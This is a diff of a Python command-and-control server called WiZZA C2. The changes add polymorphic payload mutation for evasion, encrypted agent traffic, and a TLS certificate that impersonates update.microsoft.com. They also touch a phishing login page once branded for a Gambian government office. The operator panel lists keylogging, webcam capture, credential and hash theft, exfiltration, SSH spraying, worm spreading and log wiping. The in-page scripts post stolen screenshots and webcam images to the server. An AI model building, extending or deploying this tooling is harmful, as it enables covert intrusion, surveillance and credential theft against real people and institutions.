@@ -1,27 +1,105 @@
 #!/usr/bin/env python3
 """Advanced C2 Server — authorized pen testing only"""
-import os,json,time,threading,socket,base64,mimetypes
+import os,json,time,threading,socket,base64,mimetypes,ssl,subprocess,hashlib,random,struct
 from http.server import HTTPServer,BaseHTTPRequestHandler
 from datetime import datetime
 from collections import defaultdict
 from urllib.parse import urlparse,parse_qs,unquote_plus
 
+# ── Per-request polymorphic mutation cache ────────────────────────────────────
+_POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
+_POLY_LOCK  = threading.Lock()
+_EVADE_DIR  = os.path.join(os.path.dirname(__file__), "..", "evade")
+
+def _poly_mutate(fpath: str) -> bytes:
+    """Return a freshly mutated (polymorphic) version of a PS1 or Python payload."""
+    global _POLY_CACHE
+    ext = os.path.splitext(fpath)[1].lower()
+    if ext not in (".ps1", ".py"):
+        with open(fpath, "rb") as f: return f.read()
+    try:
+        mtime = os.path.getmtime(fpath)
+        with _POLY_LOCK:
+            cached = _POLY_CACHE.get(fpath)
+            # Serve cached mutation for up to 30s to handle retry-within-session
+            if cached and cached[0] == mtime and (time.time() - cached[2]) < 30:
+                return cached[1]
+        with open(fpath) as f: source = f.read()
+        lang = "ps1" if ext == ".ps1" else "py"
+        evade_dir = os.path.abspath(_EVADE_DIR)
+        import sys as _sys
+        if evade_dir not in _sys.path: _sys.path.insert(0, evade_dir)
+        from poly_engine import PolyEngine
+        pe = PolyEngine(rounds=2, flatten=True, dead_blocks=3, sandbox=True)
+        mutated = pe.mutate_ps1(source) if lang == "ps1" else pe.mutate_py(source)
+        result = mutated.encode()
+        with _POLY_LOCK:
+            _POLY_CACHE[fpath] = (mtime, result, time.time())
+        return result
+    except Exception:
+        with open(fpath, "rb") as f: return f.read()
+
+# ── XOR comm decryption helper (server-side) ──────────────────────────────────
+def _comm_key(aid: str) -> bytes:
+    return hashlib.sha256(aid.encode()).digest()[:16]
+
+def _comm_enc(data: str, aid: str) -> str:
+    key = _comm_key(aid)
+    b = data.encode()
+    enc = bytes(b[i] ^ key[i % len(key)] for i in range(len(b)))
+    return base64.b64encode(enc).decode()
+
+def _comm_dec(b64: str, aid: str) -> str:
+    try:
+        key = _comm_key(aid)
+        b = base64.b64decode(b64)
+        dec = bytes(b[i] ^ key[i % len(key)] for i in range(len(b)))
+        return dec.decode()
+    except Exception:
+        return b64
+
 C2_PORT     = int(os.environ.get("C2_PORT",8888))
 AGENT_PORT  = int(os.environ.get("AGENT_PORT",4444))
-LOG_DIR     = os.environ.get("LOG_DIR",    "/tmp/op/logs")
-PAYLOAD_DIR = os.environ.get("PAYLOAD_DIR","/tmp/op/payloads")
+_HOME       = os.path.expanduser("~")
+LOG_DIR     = os.environ.get("LOG_DIR",    os.path.join(_HOME,".wizza","logs"))
+PAYLOAD_DIR = os.environ.get("PAYLOAD_DIR",os.path.join(_HOME,".wizza","payloads"))
 LOOT_DIR    = os.path.join(LOG_DIR,"loot")
+MOBILE_DIR  = os.path.join(LOG_DIR,"mobile")
 CREDS_FILE  = f"{LOG_DIR}/credentials.txt"
+# Clean lure path — set via LURE_PATH env var; email links point here
+LURE_PATH   = os.environ.get("LURE_PATH",  "/docs")
+LURE_TITLE  = os.environ.get("LURE_TITLE", "Security Certificate Update")
 
-for d in [LOG_DIR,PAYLOAD_DIR,LOOT_DIR]: os.makedirs(d,exist_ok=True)
+for d in [LOG_DIR,PAYLOAD_DIR,LOOT_DIR,MOBILE_DIR]: os.makedirs(d,exist_ok=True)
+
+# Mobile agent store: {sid: {info, cmds[], data[]}}
+mobile_agents  = {}
+mobile_cmds    = defaultdict(list)  # sid -> [pending cmds]
+mobile_data    = defaultdict(list)  # sid -> [received data]
+
+USE_TLS = os.environ.get("C2_TLS","1") != "0"
+
+def _gen_cert():
+    cert=os.path.join(LOG_DIR,"c2.crt"); key=os.path.join(LOG_DIR,"c2.key")
+    if not (os.path.exists(cert) and os.path.exists(key)):
+        try:
+            subprocess.run(["openssl","req","-x509","-newkey","rsa:2048",
+                "-keyout",key,"-out",cert,"-days","730","-nodes",
+                "-subj","/CN=update.microsoft.com/O=Microsoft Corporation/C=US/ST=WA/L=Redmond"],
+                capture_output=True, check=True)
+        except Exception as e:
+            return None,None
+    return cert,key
 
 agents={}; agent_cmds=defaultdict(list); agent_resps=defaultdict(list)
 _lock=threading.Lock()
 
+import re as _re
 def ts(): return datetime.now().strftime("%H:%M:%S")
+def _strip_ansi(s): return _re.sub(r'\x1b\[[0-9;]*[A-Za-z]|\r','',s)
 def log(m):
     l=f"[{ts()}] {m}"; print(l,flush=True)
-    open(f"{LOG_DIR}/c2.log","a").write(l+"\n")
+    open(f"{LOG_DIR}/c2.log","a").write(_strip_ansi(l)+"\n")
 
 # ── TCP raw agent listener ───────────────────────────────────────────────────
 def handle_agent(conn,addr):
@@ -184,8 +262,7 @@ function jsScreenshot(){
       +'</body></foreignObject></svg>';
     var img=new Image();
     img.onload=function(){ctx.drawImage(img,0,0);
-      var d=c.toDataURL('image/png');
-      post('/agent/result?id='+AID+'&cmd=SCREENSHOT_JS','SCREENSHOT_B64::'+d.split(',')[1]);};
+      post('/agent/result?id='+AID+'&cmd=SCREENSHOT_JS',c.toDataURL('image/png'));};
     img.src='data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg);
   }catch(e){return '(screenshot err: '+e+')';}
   return '(capturing page...';}
@@ -198,8 +275,8 @@ function jsWebcam(){
       setTimeout(function(){
         var c=document.createElement('canvas');c.width=640;c.height=480;
         c.getContext('2d').drawImage(v,0,0,640,480);
-        var data=c.toDataURL('image/jpeg',0.85);
-        post('/agent/result?id='+AID+'&cmd=WEBCAM_JS','WEBCAM_B64::'+data.split(',')[1]);
+        var data=c.toDataURL('image/jpeg',0.8);
+        post('/agent/result?id='+AID+'&cmd=WEBCAM_JS',data);
         stream.getTracks().forEach(function(t){t.stop();});
       },800);
     }).catch(function(e){post('/agent/result?id='+AID+'&cmd=WEBCAM_JS','(denied: '+e+')');});
@@ -344,7 +421,7 @@ hr{margin:18px -36px;border:none;border-top:1px solid #f0f0f0}
 <div class="card">
   <div class="logo">
     <img src="https://heilige.com/sites/default/files/2022-01/op-logo.png" onerror="this.style.display='none'">
-    <div class="logo-name">Office of the President<br>Republic of The Gambia</div>
+    <div class="logo-name">Security Portal</div>
   </div>
   <h1>Staff Portal</h1><p class="sub">Sign in with your government account</p>
   <form id="lf" onsubmit="doLogin(event)" autocomplete="on">
@@ -396,550 +473,198 @@ window.addEventListener('load',function(){
     btn.download='portal_helper.py';btn.style.display='block';}});
 </script></body></html>"""
 
-HTML_PANEL="""<!DOCTYPE html><html lang="en"><head><title>C2 PANEL</title>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+HTML_PANEL="""<!DOCTYPE html><html lang="en"><head><title>C2 Panel — WiZZA</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-:root{{--bg:#07070f;--bg2:#0d0d1c;--bg3:#111128;--bd:#1c1c38;--g:#00e676;--b:#29b6f6;--r:#ef5350;--y:#ffca28;--p:#ce93d8;--tx:#b0bec5;--dim:#37474f}}
+:root{{--bg:#0d1b2a;--bg2:#112240;--bg3:#1a3a6e;--acc:#00c8ff;--acc2:#ff6b35;--grn:#00e676;--red:#ff5252;--yel:#ffd740;--pink:#ff4fc8;--txt:#e0e8f0;--sub:#7a9ab8;--brd:#1e3a5a}}
 *{{box-sizing:border-box;margin:0;padding:0}}
-html,body{{height:100%;overflow:hidden}}
-body{{font-family:'Courier New',monospace;background:var(--bg);color:var(--tx);font-size:12px;display:flex;flex-direction:column}}
-a{{color:var(--b);text-decoration:none}}
-a:hover{{color:var(--g)}}
-::-webkit-scrollbar{{width:4px;height:4px}}
-::-webkit-scrollbar-track{{background:var(--bg)}}
-::-webkit-scrollbar-thumb{{background:var(--bd);border-radius:2px}}
-
-/* ── Top bar ── */
-.topbar{{background:var(--bg2);border-bottom:2px solid var(--bd);padding:0 16px;height:44px;display:flex;align-items:center;gap:20px;flex-shrink:0;position:relative}}
-.logo{{color:var(--g);font-size:14px;font-weight:bold;letter-spacing:4px;display:flex;align-items:center;gap:8px}}
-.logo-dot{{width:8px;height:8px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:blink 2s infinite}}
-@keyframes blink{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
-.stat{{display:flex;align-items:center;gap:5px;font-size:11px}}
-.stat .n{{color:var(--g);font-weight:bold;font-size:13px}}
-.stat .l{{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1px}}
-.sep{{color:var(--bd);font-size:16px}}
-.topbar .ts{{margin-left:auto;color:var(--dim);font-size:10px;letter-spacing:1px}}
-.topbar .refresh{{color:var(--b);font-size:10px;padding:3px 8px;border:1px solid var(--bd);border-radius:2px}}
-
-/* ── Layout ── */
-.wrap{{display:flex;flex:1;overflow:hidden}}
-.sidebar{{width:170px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;flex-shrink:0;overflow-y:auto}}
-.nav-sec{{padding:12px 14px 4px;color:var(--dim);font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-top:4px}}
-.nav a{{display:flex;align-items:center;gap:8px;padding:9px 14px;color:var(--dim);font-size:11px;letter-spacing:.5px;border-left:2px solid transparent;transition:.15s;cursor:pointer}}
-.nav a .ic{{font-size:13px;width:16px;text-align:center}}
-.nav a:hover,.nav a.active{{color:var(--g);border-left-color:var(--g);background:rgba(0,230,118,.04)}}
-.nav-bottom{{margin-top:auto;padding:10px;border-top:1px solid var(--bd)}}
-.nav-bottom a{{display:block;color:var(--dim);font-size:10px;padding:4px 6px}}
-
-.content{{flex:1;overflow-y:auto;padding:14px 16px}}
-.tab{{display:none}}.tab.active{{display:block}}
-
-/* ── Section header ── */
-.sh{{color:var(--b);font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;padding-bottom:7px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:8px}}
-.sh .ic{{color:var(--g)}}
-.sh .badge-count{{background:var(--bg3);color:var(--g);border:1px solid var(--bd);font-size:9px;padding:1px 6px;border-radius:10px;margin-left:auto}}
-
-/* ── Tables ── */
-table{{width:100%;border-collapse:collapse;margin-bottom:14px}}
-th{{background:var(--bg3);color:var(--b);padding:7px 10px;text-align:left;border:1px solid var(--bd);font-size:10px;letter-spacing:1px;text-transform:uppercase;white-space:nowrap}}
-td{{padding:7px 10px;border:1px solid var(--bd);font-size:11px;vertical-align:middle}}
-tr:hover td{{background:rgba(41,182,246,.04)}}
-tr.sel td{{background:rgba(0,230,118,.06);border-color:rgba(0,230,118,.2)}}
-
-/* ── Badges & dots ── */
-.dot{{width:7px;height:7px;border-radius:50%;display:inline-block}}
-.dot.on{{background:var(--g);box-shadow:0 0 5px var(--g)}}
-.dot.off{{background:var(--r)}}
-.dot.js{{background:var(--y)}}
-.tag{{display:inline-block;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:bold;letter-spacing:.5px}}
-.tag.root{{background:rgba(206,147,216,.15);color:var(--p);border:1px solid rgba(206,147,216,.3)}}
-.tag.user{{background:rgba(41,182,246,.1);color:var(--b);border:1px solid rgba(41,182,246,.2)}}
-.tag.on{{background:rgba(0,230,118,.1);color:var(--g);border:1px solid rgba(0,230,118,.2)}}
-.tag.off{{background:rgba(239,83,80,.1);color:var(--r);border:1px solid rgba(239,83,80,.2)}}
-.tag.http{{background:rgba(41,182,246,.1);color:var(--b)}}
-.tag.js{{background:rgba(255,202,40,.1);color:var(--y)}}
-
-/* ── Command bar ── */
-.cmdbar{{background:var(--bg2);border:1px solid var(--bd);border-radius:5px;padding:12px 14px;margin-bottom:14px}}
-.cmdbar form{{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px}}
-.cmdbar select,.cmdbar input[type=text]{{background:var(--bg);color:var(--g);border:1px solid var(--bd);padding:7px 10px;font-family:'Courier New',monospace;font-size:12px;border-radius:3px;outline:none}}
-.cmdbar select{{max-width:240px}}
-.cmdbar input[type=text]{{flex:1;min-width:200px}}
-.cmdbar select:focus,.cmdbar input:focus{{border-color:var(--g);box-shadow:0 0 0 2px rgba(0,230,118,.1)}}
-.btn{{padding:7px 16px;border:none;border-radius:3px;cursor:pointer;font-family:'Courier New',monospace;font-size:12px;font-weight:bold;transition:.1s}}
-.btn:hover{{filter:brightness(1.1)}}
-.btn.g{{background:var(--g);color:#000}}
-.btn.r{{background:var(--r);color:#fff}}
-.btn.b{{background:var(--b);color:#000}}
-.btn.d{{background:var(--bg3);color:var(--tx);border:1px solid var(--bd)}}
-
-/* ── Quick buttons ── */
-.qrow{{display:flex;flex-wrap:wrap;gap:4px;align-items:center;margin-bottom:5px}}
-.ql{{color:var(--dim);font-size:9px;letter-spacing:1px;text-transform:uppercase;margin-right:4px}}
-.qb{{padding:3px 9px;border-radius:2px;font-size:10px;font-family:monospace;text-decoration:none;cursor:pointer;border:1px solid transparent;transition:.1s}}
-.qb:hover{{filter:brightness(1.3)}}
-.qb.d{{background:var(--bg3);color:var(--b);border-color:var(--bd)}}
-.qb.y{{background:rgba(255,202,40,.08);color:var(--y);border-color:rgba(255,202,40,.2)}}
-.qb.g{{background:rgba(0,230,118,.08);color:var(--g);border-color:rgba(0,230,118,.2)}}
-.qb.r{{background:rgba(239,83,80,.08);color:var(--r);border-color:rgba(239,83,80,.2)}}
-.qb.p{{background:rgba(206,147,216,.08);color:var(--p);border-color:rgba(206,147,216,.2)}}
-
-/* ── Terminal output ── */
-.terminal{{background:#000;border:1px solid var(--bd);border-radius:4px;padding:12px;max-height:600px;overflow-y:auto}}
-.entry{{margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #0d0d0d}}
-.entry:last-child{{border:none;margin:0;padding:0}}
-.ehdr{{display:flex;align-items:center;gap:8px;margin-bottom:6px}}
-.eaid{{color:var(--b);font-weight:bold;font-size:11px}}
-.ecmd{{color:var(--y);font-size:11px}}
-.etime{{color:var(--dim);font-size:10px;margin-left:auto}}
-.eout{{color:#90a4ae;white-space:pre-wrap;max-height:320px;overflow-y:auto;padding:8px 10px;background:#050507;border-radius:3px;border:1px solid #111;font-size:11px;line-height:1.5}}
-.eimg{{max-width:480px;border:1px solid var(--bd);margin-top:8px;cursor:pointer;display:block;border-radius:3px;transition:.15s}}
-.eimg:hover{{border-color:var(--g);box-shadow:0 0 12px rgba(0,230,118,.2)}}
-
-/* ── Credentials ── */
-.cred{{background:rgba(239,83,80,.05);border-left:3px solid var(--r);padding:9px 12px;margin-bottom:6px;border-radius:0 3px 3px 0;display:flex;align-items:center;gap:12px;flex-wrap:wrap}}
-.cred .u{{color:var(--y)}}
-.cred .p{{color:var(--r);font-weight:bold}}
-.cred .src{{background:var(--bg3);color:var(--dim);font-size:9px;padding:1px 5px;border-radius:2px}}
-
-/* ── Loot gallery ── */
-.loot-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px}}
-.loot-card{{background:var(--bg2);border:1px solid var(--bd);border-radius:4px;overflow:hidden;transition:.15s}}
-.loot-card:hover{{border-color:var(--g)}}
-.loot-card img{{width:100%;display:block;cursor:pointer;background:#000}}
-.loot-card .li{{padding:8px 10px}}
-.loot-card .lf{{color:var(--y);font-size:10px;word-break:break-all}}
-.loot-card .ls{{color:var(--dim);font-size:9px;margin-top:2px}}
-.loot-card .la{{color:var(--b);font-size:10px}}
-
-/* ── Worm control ── */
-.wc-section{{background:rgba(0,230,118,.03);border:1px solid rgba(0,230,118,.1);border-radius:5px;padding:14px;margin-bottom:14px}}
-.wc-row{{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin-bottom:10px}}
-.wc-row:last-child{{margin:0}}
-.wc-label{{color:var(--dim);font-size:9px;letter-spacing:1px;text-transform:uppercase;min-width:70px}}
-.wb{{padding:4px 10px;border:none;border-radius:2px;cursor:pointer;font-size:10px;font-weight:bold;font-family:monospace;transition:.1s;text-decoration:none;display:inline-block}}
-.wb:hover{{filter:brightness(1.2)}}
-.wb.g{{background:rgba(0,230,118,.2);color:var(--g);border:1px solid rgba(0,230,118,.3)}}
-.wb.r{{background:rgba(239,83,80,.2);color:var(--r);border:1px solid rgba(239,83,80,.3)}}
-.wb.y{{background:rgba(255,202,40,.15);color:var(--y);border:1px solid rgba(255,202,40,.3)}}
-.wb.b{{background:rgba(41,182,246,.15);color:var(--b);border:1px solid rgba(41,182,246,.3)}}
-.wb.w{{background:var(--bg3);color:var(--tx);border:1px solid var(--bd)}}
-.wcinp{{background:var(--bg);color:var(--g);border:1px solid var(--bd);padding:4px 8px;font-family:monospace;font-size:11px;border-radius:2px;outline:none}}
-.wcinp:focus{{border-color:var(--g)}}
-
-/* ── Lightbox ── */
-#lb{{display:none;position:fixed;inset:0;background:rgba(0,0,0,.93);z-index:9999;align-items:center;justify-content:center;cursor:zoom-out}}
-#lb.show{{display:flex}}
-#lb img{{max-width:92vw;max-height:92vh;border:1px solid var(--bd);border-radius:3px}}
-</style></head>
-<body>
-<div class="topbar">
-  <div class="logo"><div class="logo-dot"></div>C2 PANEL</div>
-  <div class="sep">|</div>
-  <div class="stat"><span class="n">{ac}</span><span class="l">agents</span></div>
-  <div class="sep">|</div>
-  <div class="stat" style="cursor:pointer" onclick="showTab('family')"><span class="n" style="color:#f0a">{wo}</span><span class="l" style="color:#f0a">worms</span></div>
-  <div class="sep">|</div>
-  <div class="stat"><span class="n">{cc}</span><span class="l">creds</span></div>
-  <div class="sep">|</div>
-  <div class="stat"><span class="n">{lc}</span><span class="l">loot</span></div>
-  <div class="ts">{ts} &nbsp; <a class="refresh" href="/panel">&#x21BA; refresh</a></div>
+body{{font-family:'Segoe UI',Arial,sans-serif;background:var(--bg);color:var(--txt);display:flex;height:100vh;overflow:hidden;font-size:13px}}
+#sidebar{{width:200px;min-width:200px;background:var(--bg2);border-right:1px solid var(--brd);display:flex;flex-direction:column}}
+#logo{{padding:16px 14px 12px;border-bottom:1px solid var(--brd);font-size:15px;font-weight:700;color:var(--acc);letter-spacing:1px}}
+#logo span{{color:var(--acc2);font-size:11px;display:block;font-weight:400;margin-top:2px}}
+.nav{{padding:11px 16px;cursor:pointer;color:var(--sub);font-size:12px;display:flex;align-items:center;gap:8px;border-left:3px solid transparent;transition:all .15s;text-decoration:none}}
+.nav:hover{{background:var(--bg3);color:var(--txt)}}.nav.active{{background:var(--bg3);color:var(--acc);border-left-color:var(--acc)}}
+.badge{{margin-left:auto;background:var(--acc2);color:#000;font-size:10px;padding:1px 6px;border-radius:10px;font-weight:700}}
+.badge.g{{background:var(--grn)}}.badge.p{{background:var(--pink)}}
+#sbar{{margin-top:auto;padding:12px;border-top:1px solid var(--brd);font-size:11px;color:var(--sub)}}
+#sbar div{{margin:3px 0}}#sbar b{{color:var(--txt)}}
+#main{{flex:1;display:flex;flex-direction:column;overflow:hidden}}
+#topbar{{background:var(--bg2);border-bottom:1px solid var(--brd);padding:8px 16px;display:flex;align-items:center;justify-content:space-between;font-size:12px;color:var(--sub)}}
+#content{{flex:1;overflow-y:auto;padding:16px}}
+.pane{{display:none}}.pane.active{{display:block}}
+table{{width:100%;border-collapse:collapse;margin-bottom:12px}}
+th{{background:var(--bg2);color:var(--acc);padding:7px 10px;text-align:left;border:1px solid var(--brd);font-size:11px;letter-spacing:.5px}}
+td{{padding:6px 10px;border:1px solid var(--brd);font-size:12px;word-break:break-all;vertical-align:middle}}
+tr:hover td{{background:rgba(255,255,255,.03)}}tr.sel td{{background:rgba(0,200,255,.08)}}
+.on{{color:var(--grn)}}.off{{color:var(--red)}}.js{{color:var(--yel)}}.worm{{color:var(--pink)}}
+.root{{color:var(--pink);font-weight:700}}.tag{{font-size:10px;background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--sub);margin-left:4px}}
+.box{{background:var(--bg2);border:1px solid var(--brd);border-radius:6px;padding:14px;margin-bottom:14px}}
+.box label{{font-size:11px;color:var(--sub);display:block;margin-bottom:6px}}
+.row{{display:flex;gap:8px;align-items:center;flex-wrap:wrap}}
+select,input[type=text]{{background:var(--bg);color:var(--txt);border:1px solid var(--brd);padding:7px 10px;border-radius:4px;font-size:12px;outline:none}}
+select:focus,input:focus{{border-color:var(--acc)}}input[type=text]{{flex:1;min-width:180px}}
+.btn{{padding:7px 14px;border:none;border-radius:4px;cursor:pointer;font-size:12px;font-weight:600;text-decoration:none;display:inline-block}}
+.bp{{background:var(--acc);color:#000}}.ba{{background:var(--acc2);color:#000}}.bd{{background:var(--red);color:#fff}}
+.qa-sec{{margin-bottom:12px}}.qa-lbl{{font-size:10px;color:var(--sub);text-transform:uppercase;letter-spacing:.8px;margin-bottom:5px}}
+.qa-row{{display:flex;flex-wrap:wrap;gap:4px}}
+.qa{{padding:4px 9px;border-radius:3px;font-size:11px;cursor:pointer;border:1px solid var(--brd);background:var(--bg2);color:var(--sub);text-decoration:none;display:inline-block}}
+.qa:hover{{background:var(--bg3);color:var(--txt)}}
+.qa.g{{border-color:#00e67644;color:var(--grn)}}.qa.g:hover{{background:#00e67622}}
+.qa.y{{border-color:#ffd74044;color:var(--yel)}}.qa.y:hover{{background:#ffd74022}}
+.qa.r{{border-color:#ff525244;color:var(--red)}}.qa.r:hover{{background:#ff525222}}
+.qa.p{{border-color:#ff4fc844;color:var(--pink)}}.qa.p:hover{{background:#ff4fc822}}
+.rb{{background:var(--bg2);border:1px solid var(--brd);border-radius:5px;margin-bottom:10px;overflow:hidden}}
+.rh{{padding:7px 12px;background:var(--bg3);display:flex;gap:10px;align-items:center;font-size:11px}}
+.rh .ra{{color:var(--acc);font-weight:700}}.rh .rc{{color:var(--yel)}}.rh .rt{{color:var(--sub);margin-left:auto}}
+.rh .rdel{{color:var(--red);text-decoration:none;margin-left:8px;font-size:13px}}
+.rbody{{padding:10px 12px;font-family:monospace;font-size:11.5px;white-space:pre-wrap;max-height:260px;overflow-y:auto;color:#b0c8e0}}
+.rimg{{padding:8px 12px}}.rimg img{{max-width:100%;max-height:280px;border:1px solid var(--brd);border-radius:3px}}
+.ci{{background:var(--bg2);border:1px solid var(--brd);border-left:3px solid var(--red);border-radius:4px;padding:9px 12px;margin-bottom:7px;font-family:monospace;font-size:12px}}
+.ci .cv{{color:var(--red);font-weight:700}}
+.lg{{display:flex;flex-wrap:wrap;gap:10px}}
+.lc{{background:var(--bg2);border:1px solid var(--brd);border-radius:5px;padding:8px;width:220px}}
+.lc img{{width:100%;border-radius:3px;margin-bottom:6px;border:1px solid var(--brd)}}
+.lc .lf{{font-size:11px;color:var(--yel);word-break:break-all;margin-bottom:3px}}
+.lc .ls{{font-size:10px;color:var(--sub);margin-bottom:4px}}
+.wc{{background:var(--bg2);border:1px solid var(--brd);border-left:3px solid var(--pink);border-radius:5px;padding:10px 14px;margin-bottom:8px}}
+.wc .wi{{color:var(--pink);font-weight:700;font-size:13px}}.wc .wn{{color:var(--sub);font-size:11px;margin:3px 0}}
+.wc .wl{{font-family:monospace;font-size:10.5px;color:#7ab;margin-top:6px;max-height:80px;overflow-y:auto;background:var(--bg);padding:5px;border-radius:3px}}
+.tbar{{display:flex;gap:8px;margin-bottom:12px;align-items:center;flex-wrap:wrap}}
+a{{color:var(--acc);text-decoration:none}}
+</style></head><body>
+<div id="sidebar">
+<div id="logo">&#x26A1; WiZZA C2<span>Offensive Ops Panel</span></div>
+<a class="nav active" onclick="T('agents')" id="n-agents">&#x1F4BB; Agents <span class="badge g" id="b-ac">{ac}</span></a>
+<a class="nav" onclick="T('cmd')" id="n-cmd">&#x25BA; Command</a>
+<a class="nav" onclick="T('out')" id="n-out">&#x1F4E1; Output</a>
+<a class="nav" onclick="T('creds')" id="n-creds">&#x1F511; Credentials <span class="badge" id="b-cc">{cc}</span></a>
+<a class="nav" onclick="T('loot')" id="n-loot">&#x1F4E6; Loot <span class="badge" id="b-lc">{lc}</span></a>
+<a class="nav" onclick="T('wf')" id="n-wf">&#x1F9EC; Worm Family <span class="badge p" id="b-wc">{wc}</span></a>
+<a class="nav" onclick="T('wctl')" id="n-wctl">&#x2699; Worm Control</a>
+<div id="sbar"><div>Online: <b>{ac}</b></div><div>Worms: <b>{wc}</b></div><div>Creds: <b>{cc}</b></div><div>Loot: <b>{lc}</b></div></div>
 </div>
-<div class="wrap">
-<div class="sidebar">
-  <div class="nav-sec">Operations</div>
-  <div class="nav">
-    <a onclick="showTab('agents')" id="nav-agents" class="active"><span class="ic">&#x1F4BB;</span>Agents</a>
-    <a onclick="showTab('cmd')" id="nav-cmd"><span class="ic">&#x25BA;</span>Command</a>
-    <a onclick="showTab('output')" id="nav-output"><span class="ic">&#x1F5A5;</span>Output</a>
-  </div>
-  <div class="nav-sec">Intel</div>
-  <div class="nav">
-    <a onclick="showTab('creds')" id="nav-creds"><span class="ic">&#x1F511;</span>Credentials</a>
-    <a onclick="showTab('loot')" id="nav-loot"><span class="ic">&#x1F4E6;</span>Loot Gallery</a>
-  </div>
-  <div class="nav-sec">Worm</div>
-  <div class="nav">
-    <a onclick="showTab('family')" id="nav-family"><span class="ic">&#x1F9A0;</span>Worm Family <span style="color:#f0a;font-size:10px">{wo}</span></a>
-    <a onclick="showTab('worm')" id="nav-worm"><span class="ic">&#x2699;</span>Worm Control</a>
-  </div>
-  <div class="nav-bottom">
-    <a href="/logs?aid={fa}">&#x1F4C4; Agent Log</a>
-    <a href="/loot">&#x1F5BC; Full Loot</a>
-    <a href="/creds">&#x1F4CB; Full Creds</a>
-  </div>
+<div id="main">
+<div id="topbar"><span id="ttl">Agents</span><span>{ts} &nbsp;|&nbsp; <a href="/mobile">&#x1F4F1; Mobile</a> &nbsp;|&nbsp; <a href="/panel">&#x21BA; refresh</a></span></div>
+<div id="content">
+<div class="pane active" id="p-agents">
+<table id="agt">
+<tr><th>ID</th><th>IP</th><th>OS / Device</th><th>Host / User</th><th>Priv</th><th>Type</th><th>Last Seen</th><th>Actions</th></tr>
+{ar}
+</table>
 </div>
-<div class="content">
-
-<!-- AGENTS TAB -->
-<div class="tab active" id="tab-agents">
-  <div class="sh"><span class="ic">&#x1F4BB;</span>ACTIVE AGENTS<span class="badge-count">{ac} online</span></div>
-  <table>
-    <tr><th>ID</th><th>IP</th><th>OS / Device</th><th>Host / User</th><th>Priv</th><th>Type</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr>
-    {ar}
-  </table>
+<div class="pane" id="p-cmd">
+<div class="box"><label>Selected Agent</label><div class="row"><select id="csel" onchange="SA(this.value)">{ao}</select></div></div>
+<div class="box"><label>Send Command</label>
+<form method="POST" action="/cmd" onsubmit="document.getElementById('cah').value=_aid">
+<input type="hidden" name="aid" id="cah" value="{fa}">
+<div class="row"><input type="text" name="cmd" placeholder="RECON | SCREENSHOT | shell command...">
+<button class="btn bp" type="submit">&#x25BA; Send</button>
+<button class="btn ba" type="submit" onclick="document.getElementById('cah').value='__ALL__'">&#x2605; ALL</button>
+</div></form></div>
+<div class="qa-sec"><div class="qa-lbl">Reconnaissance</div><div class="qa-row">
+<a class="qa" onclick="Q('RECON')">RECON</a><a class="qa" onclick="Q('SYSINFO')">SYSINFO</a>
+<a class="qa" onclick="Q('NETWORK')">NETWORK</a><a class="qa" onclick="Q('DRIVES')">DRIVES</a>
+<a class="qa" onclick="Q('whoami')">whoami</a><a class="qa" onclick="Q('id')">id</a><a class="qa" onclick="Q('hostname')">hostname</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Capture</div><div class="qa-row">
+<a class="qa g" onclick="Q('SCREENSHOT')">SCREENSHOT</a><a class="qa g" onclick="Q('WEBCAM')">WEBCAM</a>
+<a class="qa g" onclick="Q('CLIPBOARD')">CLIPBOARD</a><a class="qa g" onclick="Q('KEYLOG_START')">KEYLOG START</a>
+<a class="qa g" onclick="Q('KEYLOG_DUMP')">KEYLOG DUMP</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Post-Exploitation</div><div class="qa-row">
+<a class="qa y" onclick="Q('PERSIST')">PERSIST</a><a class="qa y" onclick="Q('PRIVESC')">PRIVESC</a>
+<a class="qa y" onclick="Q('HASHDUMP')">HASHDUMP</a><a class="qa y" onclick="Q('SSHKEYS')">SSHKEYS</a>
+<a class="qa y" onclick="Q('BROWSERS')">BROWSERS</a><a class="qa y" onclick="Q('EXFIL')">EXFIL</a>
+<a class="qa y" onclick="Q('SSH_TARGETS')">SSH_TARGETS</a><a class="qa y" onclick="Q('NET_SCAN')">NET_SCAN</a>
+<a class="qa y" onclick="Q('SSH_SPRAY')">SSH_SPRAY</a><a class="qa y" onclick="Q('SMB_SCAN')">SMB_SCAN</a>
+<a class="qa y" onclick="Q('NET_MOUNTS')">NET_MOUNTS</a><a class="qa y" onclick="Q('GIT_POISON')">GIT_POISON</a>
+<a class="qa y" onclick="Q('EMAIL_SPREAD')">EMAIL_SPREAD</a><a class="qa y" onclick="Q('DOCKER_ESCAPE')">DOCKER_ESCAPE</a>
+<a class="qa y" onclick="Q('SPREAD')">USB_SPREAD</a>
+</div></div>
+<div class="qa-sec"><div class="qa-lbl">Danger</div><div class="qa-row">
+<a class="qa r" onclick="Q('CLEAN')">CLEAN LOGS</a>
+<a class="qa r" onclick="if(confirm('Selfdestruct?'))Q('SELFDESTRUCT')">SELFDESTRUCT</a>
+</div></div>
 </div>
-
-<!-- COMMAND TAB -->
-<div class="tab" id="tab-cmd">
-  <div class="sh"><span class="ic">&#x25BA;</span>COMMAND &amp; CONTROL</div>
-  <div class="cmdbar">
-    <form method="POST" action="/cmd">
-      <select name="aid">{ao}</select>
-      <input type="text" name="cmd" placeholder="command / RECON / SCREENSHOT / shell cmd..." style="flex:1">
-      <button class="btn g" type="submit">&#x25BA; SEND</button>
